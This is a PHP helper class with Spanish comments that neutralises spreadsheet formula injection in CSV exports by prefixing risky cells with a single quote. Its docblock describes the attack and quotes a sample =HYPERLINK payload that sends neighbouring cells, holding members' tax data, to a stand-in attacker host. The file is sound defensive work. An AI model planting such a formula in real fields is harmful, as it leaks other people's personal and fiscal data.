<?php

namespace App\Support;

/**
 * Neutraliza una celda antes de escribirla en un CSV.
 *
 * ## Por qué existe
 *
 * Excel, LibreOffice y Google Sheets **evalúan** una celda que empieza por
 * `=`, `+`, `-`, `@`, tabulador o retorno de carro. Y varias de las columnas
 * que Nódico exporta las escribe el propio miembro sin restricción de
 * caracteres: su nombre (`users.name`), su teléfono y su razón social
 * (`datos_fiscales.razon_social`).
 *
 * El camino completo del ataque, encontrado en la revisión de seguridad del
 * 01/09/2026:
 *
 * 1. Un miembro pone en su nombre
 *    `=HYPERLINK("https://atacante.mx/x?d="&A1&B1,"Ver factura")`.
 * 2. Se salta dos reservas, o deja de venir tres semanas, para aparecer en el
 *    informe de no-show o en el de miembros en riesgo.
 * 3. Administración exporta el CSV y lo abre en Excel —el archivo lleva BOM
 *    justamente para que se abra ahí—.
 * 4. La fórmula se evalúa **en la máquina de administración**. En el CSV de
 *    facturación las celdas vecinas llevan el RFC, la razón social y el código
 *    postal de todos los miembros: un clic los manda fuera.
 *
 * Es un cruce de privilegios de miembro a administración, y no lo arregla
 * validar la entrada: un nombre puede empezar por `-` legítimamente.
 *
 * ## Cómo se neutraliza
 *
 * Anteponiendo una comilla simple, que es la forma canónica de decirle a una
 * hoja de cálculo «esto es texto». El valor se ve igual al leerlo y deja de
 * ejecutarse.
 */
final class CeldaCsv
{
    /** Caracteres con los que una hoja de cálculo empieza a interpretar fórmula. */
    private const PELIGROSOS = "=+-@\t\r";

    public static function segura(mixed $valor): mixed
    {
        if (! is_string($valor) || $valor === '') {
            return $valor;
        }

        return str_contains(self::PELIGROSOS, $valor[0]) ? "'" . $valor : $valor;
    }

    /**
     * Una fila entera. Los arrays se serializan a JSON antes, porque una celda
     * no puede contener un array y `fputcsv` avisaría con un `Array to string`.
     *
     * @param  array<int|string, mixed>  $fila
     * @return array<int, mixed>
     */
    public static function fila(array $fila): array
    {
        return array_map(
            fn ($v) => self::segura(is_array($v) ? json_encode($v, JSON_UNESCAPED_UNICODE) : $v),
            array_values($fila),
        );
    }
}
